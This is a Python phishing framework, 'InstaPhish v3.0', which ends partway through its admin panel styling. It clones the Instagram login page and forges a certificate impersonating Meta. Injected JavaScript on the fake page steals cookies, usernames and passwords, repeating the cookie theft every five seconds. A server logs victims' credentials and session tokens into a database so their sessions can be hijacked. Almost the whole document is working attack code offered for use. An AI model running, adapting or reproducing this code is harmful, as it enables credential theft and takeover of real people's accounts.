#!/usr/bin/env python3
"""
InstaPhish v3.0 - Advanced MITM Instagram Phishing Framework
Author: r4tur1
Features: Full MITM Proxy, Cookie Interception, Session Hijacking, 2FA Bypass
Port: 4040 | No Limits | Pixel-Perfect Clone
"""

import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import http.server
import socketserver
import subprocess

# ==================== CONFIGURATION ====================
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 4040,
    "admin_port": 5000,
    "target_domain": "www.instagram.com",
    "cookie_domains": [".instagram.com", ".cdninstagram.com", ".fbcdn.net"],
    "ssl_cert": "certs/instagram.crt",
    "ssl_key": "certs/instagram.key",
    "db_file": "victims.db",
    "log_file": "logs/credentials.txt",
    "cookie_file": "logs/cookies.txt",
    "session_file": "logs/sessions.txt",
    "lure_dir": "lures",
    "clone_dir": "cloned_site",
    "user_agents_file": "payloads/user_agents.txt",
    "proxies_file": "payloads/proxies.txt"
}

# ==================== COLOR OUTPUT ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║  {Colors.WHITE}█ █▄░█ █▀ ▀█▀ ▄▀█ █▀█ █░█ █ █▀ █░█   █░█ ▄▄ █▀█{Colors.RED}  ║
║  {Colors.WHITE}█ █░▀█ ▄█ ░█░ █▀█ █▀▀ █▀█ █ ▄█ █▀█   ▀▄▀ ░░ █▄█{Colors.RED}  ║
║                                                                  ║
║  {Colors.GREEN}Advanced MITM Framework v3.0 - r4tur1{Colors.RED}                       ║
║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | No Limits | Full Cookie Hijack{Colors.RED}                 ║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

# ==================== SETUP ====================
class Setup:
    @staticmethod
    def create_directories():
        dirs = ["certs", "logs", "lures", "cloned_site", "payloads", 
                "cloned_site/css", "cloned_site/js", "cloned_site/images",
                "cloned_site/api", "sessions"]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
    
    @staticmethod
    def generate_ssl_cert():
        if not os.path.exists(CONFIG["ssl_cert"]):
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG['ssl_key']} \
                -out {CONFIG['ssl_cert']} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com,DNS:www.instagram.com" \
                -addext "basicConstraints=CA:FALSE" \
                -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment" \
                -addext "extendedKeyUsage=serverAuth,clientAuth" 2>/dev/null
            """
            os.system(cmd)
            print(f"{Colors.GREEN}[+] SSL Certificate generated with extended SANs{Colors.RESET}")
    
    @staticmethod
    def create_user_agents():
        agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        ]
        with open(CONFIG["user_agents_file"], "w") as f:
            f.write("\n".join(agents))
    
    @staticmethod
    def init_database():
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            username TEXT,
            password TEXT,
            email TEXT,
            phone TEXT,
            sessionid TEXT,
            csrftoken TEXT,
            ds_user_id TEXT,
            rur TEXT,
            mid TEXT,
            ig_did TEXT,
            datr TEXT,
            all_cookies TEXT,
            two_factor_code TEXT,
            backup_codes TEXT,
            fingerprint TEXT,
            referer TEXT,
            geo_location TEXT,
            device_info TEXT,
            login_flow TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            sessionid TEXT,
            csrftoken TEXT,
            captured_at TEXT,
            last_validated TEXT,
            is_active INTEGER DEFAULT 1,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS intercepted_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            data_type TEXT,
            data_content TEXT,
            url TEXT,
            timestamp TEXT,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        )''')
        conn.commit()
        conn.close()

# ==================== INSTAGRAM SITE CLONER ====================
class InstagramCloner:
    @staticmethod
    def clone_login_page():
        """Pixel-perfect Instagram login page clone with 2024 styling"""
        html = r"""<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>Instagram</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
    <style>
        :root {
            --ig-primary-background: #000000;
            --ig-secondary-background: #121212;
            --ig-tertiary-background: #1a1a1a;
            --ig-primary-text: #f5f5f5;
            --ig-secondary-text: #a8a8a8;
            --ig-primary-button: #0095f6;
            --ig-primary-button-hover: #1877f2;
            --ig-separator: #262626;
            --ig-elevated-background: #262626;
            --ig-link-color: #e0f1ff;
            --ig-error: #ed4956;
            --ig-success: #78de45;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--ig-primary-background);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            color: var(--ig-primary-text);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }
        
        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 32px;
            padding: 20px;
            max-width: 935px;
            width: 100%;
        }
        
        .phone-preview {
            display: none;
            position: relative;
        }
        
        @media (min-width: 876px) {
            .phone-preview {
                display: block;
                flex-shrink: 0;
            }
        }
        
        .phone-frame {
            width: 380px;
            height: 582px;
            background: #000;
            border-radius: 40px;
            padding: 12px;
            box-shadow: 0 0 50px rgba(0,0,0,0.5);
            position: relative;
        }
        
        .phone-screen {
            width: 100%;
            height: 100%;
            border-radius: 28px;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        .phone-screen img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .phone-notch {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 150px;
            height: 30px;
            background: #000;
            border-radius: 0 0 20px 20px;
            z-index: 10;
        }
        
        .login-section {
            flex-grow: 1;
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background: var(--ig-secondary-background);
            border: 1px solid var(--ig-separator);
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .instagram-logo {
            font-family: 'Instagram Sans Script', cursive;
            font-size: 42px;
            margin-bottom: 24px;
            color: var(--ig-primary-text);
            font-weight: 600;
            letter-spacing: -1px;
        }
        
        .instagram-logo svg {
            width: 175px;
            height: 51px;
        }
        
        .input-field {
            position: relative;
            margin-bottom: 6px;
        }
        
        .input-field input {
            width: 100%;
            padding: 14px 8px 2px;
            background: var(--ig-tertiary-background);
            border: 1px solid var(--ig-separator);
            border-radius: 3px;
            color: var(--ig-primary-text);
            font-size: 12px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .input-field input:focus {
            border-color: var(--ig-secondary-text);
        }
        
        .input-field label {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--ig-secondary-text);
            font-size: 12px;
            transition: all 0.2s ease;
            pointer-events: none;
        }
        
        .input-field input:focus + label,
        .input-field input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 10px;
            transform: translateY(0);
        }
        
        .input-field input::placeholder {
            color: transparent;
        }
        
        .login-button {
            width: 100%;
            padding: 7px 16px;
            background: var(--ig-primary-button);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 16px;
            transition: background 0.2s;
        }
        
        .login-button:hover {
            background: var(--ig-primary-button-hover);
        }
        
        .login-button:disabled {
            opacity: 0.7;
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: var(--ig-secondary-text);
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--ig-separator);
        }
        
        .divider span {
            margin: 0 18px;
        }
        
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #0095f6;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin: 8px 0;
            cursor: pointer;
            background: none;
            border: none;
            width: 100%;
        }
        
        .facebook-login:hover {
            color: #1877f2;
        }
        
        .facebook-icon {
            width: 16px;
            height: 16px;
            background: #0095f6;
            border-radius: 2px;
            display: inline-block;
            position: relative;
            color: white;
            font-weight: bold;
            font-size: 12px;
            text-align: center;
            line-height: 16px;
        }
        
        .forgot-password {
            color: var(--ig-link-color);
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }
        
        .forgot-password:hover {
            color: var(--ig-primary-text);
        }
        
        .signup-box {
            background: var(--ig-secondary-background);
            border: 1px solid var(--ig-separator);
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .signup-box a {
            color: var(--ig-primary-button);
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup-box a:hover {
            color: var(--ig-primary-button-hover);
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-download p {
            color: var(--ig-primary-text);
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        
        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }
        
        .error-message {
            color: var(--ig-error);
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 16px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--ig-secondary-text);
        }
        
        .footer a {
            color: var(--ig-secondary-text);
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Phone Preview -->
        <div class="phone-preview">
            <div class="phone-frame">
                <div class="phone-notch"></div>
                <div class="phone-screen">
                    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 600'><rect fill='%23000' width='400' height='600'/><circle cx='200' cy='250' r='60' fill='%231a1a1a'/><text x='200' y='350' text-anchor='middle' fill='%23f5f5f5' font-size='20' font-family='Arial'>📱</text></svg>" alt="Instagram Preview">
                </div>
            </div>
        </div>
        
        <!-- Login Section -->
        <div class="login-section">
            <div class="login-box">
                <div class="instagram-logo">
                    <svg viewBox="0 0 175 51" fill="currentColor">
                        <path d="M130.3 25.5c0 14.1-11.4 25.5-25.5 25.5S79.3 39.6 79.3 25.5 90.7 0 104.8 0s25.5 11.4 25.5 25.5zm-9.5 0c0-8.8-7.2-16-16-16s-16 7.2-16 16 7.2 16 16 16 16-7.2 16-16z"/>
                        <circle cx="134.2" cy="16.3" r="6"/>
                        <path d="M37.5 25.5c0 13.7-11.1 24.9-24.9 24.9S0 39.2 0 25.5 11.1.6 24.9.6 37.5 11.8 37.5 25.5zm-9.5 0c0-8.5-6.9-15.4-15.4-15.4S0 17 0 25.5 6.9 40.9 12.6 40.9 28 34 28 25.5z"/>
                        <path d="M175 25.5c0 13.7-11.1 24.9-24.9 24.9s-24.9-11.2-24.9-24.9 11.1-24.9 24.9-24.9S175 11.8 175 25.5z"/>
                    </svg>
                </div>
                
                <form id="loginForm" method="POST" action="/accounts/login/ajax/">
                    <div class="input-field">
                        <input type="text" name="username" id="username" placeholder=" " required autocomplete="username" autocorrect="off" autocapitalize="off">
                        <label for="username">Phone number, username, or email</label>
                    </div>
                    
                    <div class="input-field">
                        <input type="password" name="enc_password" id="password" placeholder=" " required autocomplete="current-password">
                        <label for="password">Password</label>
                    </div>
                    
                    <div class="error-message" id="errorMessage">
                        Sorry, your password was incorrect. Please double-check your password.
                    </div>
                    
                    <div class="loading-spinner" id="loadingSpinner"></div>
                    
                    <button type="submit" class="login-button" id="loginButton">Log in</button>
                </form>
                
                <div class="divider"><span>OR</span></div>
                
                <button class="facebook-login" id="facebookLogin">
                    <span class="facebook-icon">f</span>
                    Log in with Facebook
                </button>
                
                <a href="/accounts/password/reset/" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="/accounts/emailsignup/">Sign up</a>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'><rect fill='%23fff' width='135' height='40' rx='5'/><text x='20' y='27' font-size='16' font-family='Arial'>App Store</text></svg>" alt="Download on App Store">
                    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'><rect fill='%23fff' width='135' height='40' rx='5'/><text x='15' y='27' font-size='16' font-family='Arial'>Google Play</text></svg>" alt="Get it on Google Play">
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
        <br><br>
        English © 2024 Instagram from Meta
    </div>
    
    <script>
    // COOKIE INTERCEPTION ENGINE
    (function() {
        // Capture existing cookies on page load
        function sendCookies() {
            var img = new Image();
            img.src = '/cookie-steal?c=' + encodeURIComponent(document.cookie);
        }
        sendCookies();
        
        // Intercept all cookie sets
        var originalCookieSetter = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').set;
        Object.defineProperty(document, 'cookie', {
            set: function(val) {
                var img = new Image();
                img.src = '/cookie-intercept?new=' + encodeURIComponent(val) + '&all=' + encodeURIComponent(document.cookie);
                return originalCookieSetter.call(this, val);
            },
            get: function() {
                return originalCookieSetter.caller;
            }
        });
        
        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var button = document.getElementById('loginButton');
            var spinner = document.getElementById('loadingSpinner');
            var errorMsg = document.getElementById('errorMessage');
            
            // Send credentials immediately
            var beacon = new Image();
            beacon.src = '/capture-creds?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
            
            // Send via fetch as backup
            fetch('/accounts/login/ajax/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': document.cookie.match(/csrftoken=([^;]+)/)?.[1] || '',
                    'X-Instagram-AJAX': '1',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'username=' + encodeURIComponent(username) + '&enc_password=' + encodeURIComponent(password) +
                      '&queryParams=%7B%7D&optIntoOneTap=false&stopDeletionNonce=&trustedDeviceRecords=%7B%7D'
            }).then(function(response) {
                return response.json();
            }).then(function(data) {
                if (data.authenticated) {
                    // Success - capture session cookies
                    var sessionBeacon = new Image();
                    sessionBeacon.src = '/session-captured?cookies=' + encodeURIComponent(document.cookie);
                    window.location.href = 'https://www.instagram.com/accounts/onetap/?next=%2F';
                } else {
                    // Show error for realism
                    errorMsg.style.display = 'block';
                    spinner.style.display = 'none';
                    button.disabled = false;
                    button.innerHTML = 'Log in';
                    
                    // Still try to capture whatever we can
                    var failBeacon = new Image();
                    failBeacon.src = '/failed-login?u=' + encodeURIComponent(username) + '&cookies=' + encodeURIComponent(document.cookie);
                }
            });
            
            // Show loading state
            button.disabled = true;
            button.innerHTML = '';
            spinner.style.display = 'block';
        });
        
        // Facebook login interceptor
        document.getElementById('facebookLogin').addEventListener('click', function() {
            var beacon = new Image();
            beacon.src = '/facebook-login-attempt?cookies=' + encodeURIComponent(document.cookie);
            alert('Facebook login is currently unavailable. Please use your username and password.');
        });
        
        // Periodic cookie exfiltration
        setInterval(function() {
            var img = new Image();
            img.src = '/periodic-cookies?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now();
        }, 5000);
    })();
    </script>
</body>
</html>"""
        
        with open(f"{CONFIG['lure_dir']}/instagram.html", "w") as f:
            f.write(html)
        print(f"{Colors.GREEN}[+] Pixel-perfect Instagram clone created with cookie hijacking{Colors.RESET}")

# ==================== MAIN MITM HANDLER ====================
class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        # Custom logging
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime("%H:%M:%S")
        if "capture" in str(args) or "cookie" in str(args) or "creds" in str(args):
            print(f"{Colors.RED}[{timestamp}] {Colors.YELLOW}[CAPTURE] {Colors.WHITE}{client_ip} {Colors.CYAN}{args[0]}{Colors.RESET}")
    
    def capture_data(self, data_type, data):
        """Store intercepted data"""
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        c.execute('''INSERT INTO intercepted_data (data_type, data_content, url, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (data_type, json.dumps(data), self.path, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def store_victim(self, username="", password="", cookies_dict=None, ip="", ua=""):
        """Store victim credentials and cookies"""
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        
        cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
        
        c.execute('''INSERT INTO victims 
                     (timestamp, ip_address, user_agent, username, password, 
                      sessionid, csrftoken, ds_user_id, rur, mid, all_cookies)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (datetime.now().isoformat(), ip, ua, username, password,
                   cookies_dict.get('sessionid', '') if cookies_dict else '',
                   cookies_dict.get('csrftoken', '') if cookies_dict else '',
                   cookies_dict.get('ds_user_id', '') if cookies_dict else '',
                   cookies_dict.get('rur', '') if cookies_dict else '',
                   cookies_dict.get('mid', '') if cookies_dict else '',
                   cookie_str))
        
        victim_id = c.lastrowid
        
        # Store active session if session cookie present
        if cookies_dict and cookies_dict.get('sessionid'):
            c.execute('''INSERT INTO active_sessions (victim_id, sessionid, csrftoken, captured_at, is_active)
                         VALUES (?, ?, ?, ?, 1)''',
                      (victim_id, cookies_dict.get('sessionid'), 
                       cookies_dict.get('csrftoken', ''), datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        # Log to files
        with open(CONFIG["log_file"], "a") as f:
            f.write(f"[{datetime.now()}] IP: {ip}\n")
            f.write(f"  Username: {username}\n  Password: {password}\n")
            if cookies_dict:
                f.write(f"  SessionID: {cookies_dict.get('sessionid', 'N/A')}\n")
                f.write(f"  CSRF: {cookies_dict.get('csrftoken', 'N/A')}\n")
            f.write("-" * 50 + "\n")
        
        if cookies_dict and cookies_dict.get('sessionid'):
            with open(CONFIG["cookie_file"], "a") as f:
                f.write(f"[{datetime.now()}] SessionID: {cookies_dict['sessionid']}\n")
                f.write(f"  Full: {cookie_str}\n")
                f.write("-" * 30 + "\n")
            
            with open(CONFIG["session_file"], "a") as f:
                f.write(f"{json.dumps(cookies_dict)}\n")
        
        print(f"{Colors.RED}[!] CREDENTIALS CAPTURED: {username}:{password} | Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
    
    def parse_cookies(self, cookie_string):
        """Parse cookie string to dictionary"""
        cookies = {}
        if cookie_string:
            for item in cookie_string.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Cookie stealing endpoint
        if '/cookie-steal' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cookies = params.get('c', [''])[0]
            cookie_dict = self.parse_cookies(cookies)
            
            if cookie_dict:
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
                print(f"{Colors.MAGENTA}[+] COOKIES STOLEN from {client_ip}: {list(cookie_dict.keys())}{Colors.RESET}")
            
            self.send_pixel_response()
            return
        
        # Cookie intercept endpoint  
        elif '/cookie-intercept' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            new_cookie = params.get('new', [''])[0]
            all_cookies = params.get('all', [''])[0]
            cookie_dict = self.parse_cookies(all_cookies)
            
            if cookie_dict:
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
                print(f"{Colors.MAGENTA}[+] COOKIE INTERCEPTED: {new_cookie[:50]}...{Colors.RESET}")
            
            self.send_pixel_response()
            return
        
        # Credential capture endpoint
        elif '/capture-creds' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            username = params.get('u', [''])[0]
            password = params.get('p', [''])[0]
            
            if username or password:
                self.store_victim(username=username, password=password, ip=client_ip, ua=user_agent)
            
            self.send_pixel_response()
            return
        
        # Session captured endpoint
        elif '/session-captured' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cookies = params.get('cookies', [''])[0]
            cookie_dict = self.parse_cookies(cookies)
            
            if cookie_dict:
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
                print(f"{Colors.GREEN}[+] SESSION HIJACKED from {client_ip}{Colors.RESET}")
            
            self.send_pixel_response()
            return
        
        # Failed login with cookies
        elif '/failed-login' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            username = params.get('u', [''])[0]
            cookies = params.get('cookies', [''])[0]
            cookie_dict = self.parse_cookies(cookies)
            
            self.store_victim(username=username, cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
            self.send_pixel_response()
            return
        
        # Facebook login attempt
        elif '/facebook-login-attempt' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cookies = params.get('cookies', [''])[0]
            cookie_dict = self.parse_cookies(cookies)
            
            if cookie_dict:
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
            
            self.send_pixel_response()
            return
        
        # Periodic cookie exfiltration
        elif '/periodic-cookies' in self.path:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cookies = params.get('c', [''])[0]
            cookie_dict = self.parse_cookies(cookies)
            
            if cookie_dict and cookie_dict.get('sessionid'):
                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
                print(f"{Colors.MAGENTA}[+] PERIODIC COOKIE GRAB: sessionid from {client_ip}{Colors.RESET}")
            
            self.send_pixel_response()
            return
        
        # Serve main login page
        elif self.path == '/' or self.path == '/accounts/login/' or self.path == '/login':
            with open(f"{CONFIG['lure_dir']}/instagram.html", "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', len(content))
            self.end_headers()
            self.wfile.write(content)
            return
        
        # Password reset page (fake)
        elif '/accounts/password/reset/' in self.path:
            reset_html = """<!DOCTYPE html><html><head><title>Reset Password • Instagram</title></head><body style="background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh"><div style="text-align:center"><h2>Trouble logging in?</h2><p>Enter your email and we'll send you a login link.</p><input type="email" placeholder="Email" style="padding:10px;width:250px;margin:10px"><br><button onclick="alert('Login link sent!')" style="padding:10px 20px;background:#0095f6;color:white;border:none;border-radius:8px">Send Login Link</button></div></body></html>"""
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(reset_html.encode())
            return
        
        # Redirect everything else to real Instagram
        else:
            self.send_response(302)
            self.send_header('Location', f'https://www.instagram.com{self.path}')
            self.end_headers()
    
    def do_POST(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode()
            
            # Main login POST
            if '/accounts/login/ajax/' in self.path or '/login' in self.path:
                params = parse_qs(post_data)
                username = params.get('username', [''])[0]
                password = params.get('enc_password', [''])[0]
                
                if username or password:
                    # Store credentials
                    self.store_victim(username=username, password=password, ip=client_ip, ua=user_agent)
                    
                    # Capture any cookies from request
                    cookie_header = self.headers.get('Cookie', '')
                    if cookie_header:
                        cookie_dict = self.parse_cookies(cookie_header)
                        if cookie_dict.get('sessionid'):
                            self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
                    
                    print(f"{Colors.GREEN}[+] LOGIN CAPTURED: {username}:{password} from {client_ip}{Colors.RESET}")
                    
                    # Return fake successful response with session cookie
                    response = {
                        "authenticated": True,
                        "user": True,
                        "userId": "123456789",
                        "status": "ok"
                    }
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Set-Cookie', f'sessionid=FAKE_SESSION_{random.randint(100000,999999)}; Domain=.instagram.com; Path=/; Secure; HttpOnly')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
                    return
                
                # Return fake error for realism on empty data
                else:
                    response = {
                        "message": "checkpoint_required",
                        "checkpoint_url": "/challenge/",
                        "lock": False,
                        "status": "fail"
                    }
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
                    return
        
        # Default redirect
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()
    
    def send_pixel_response(self):
        """Send 1x1 transparent GIF"""
        pixel = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.send_header('Content-Length', len(pixel))
        self.end_headers()
        self.wfile.write(pixel)

# ==================== ADMIN PANEL ====================
class AdminPanel:
    @staticmethod
    def start():
        admin_html = r"""<!DOCTYPE html>
<html><head><title>InstaPhish v3.0 - Control Panel</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
:root{--bg:#0a0a0a;--card:#121212;--border:#262626;--text:#f5f5f5;--accent:#0095f6;--danger:#ed4956;--success:#78de45;--warning:#f7b500}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:monospace;padding:20px}
.header{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
.header h1{color:var(--accent);font-size:24px}
.stats{display:flex;gap:15px;flex-wrap:wrap}
.stat-card{background:var(--bg);border:1px solid var(--border);padding:15px;border-radius:8px;text-align:center;min-width:120px}
.stat-card .number{font-size:28px;font-weight:bold;color:var(--accent)}
.stat-card .label{font-size:11px;color:#888;margin-top:5px}
.sessions-table{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
.sessions-table h2{padding:15px 20px;border-bottom:1px solid var(--border);font-size:16px}
table{width:100%;border-collapse:collapse}
th{background:var(--bg);padding:12px;text-align:left;font-size:12px;color:#888;border-bottom:1px solid var(--border)}
td{padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;word-break:break-all}
tr:hover{background:rgba(0,149,246,0.05)}
.session-active{color:var(--success)}
.session-expired{color:var(--danger)}
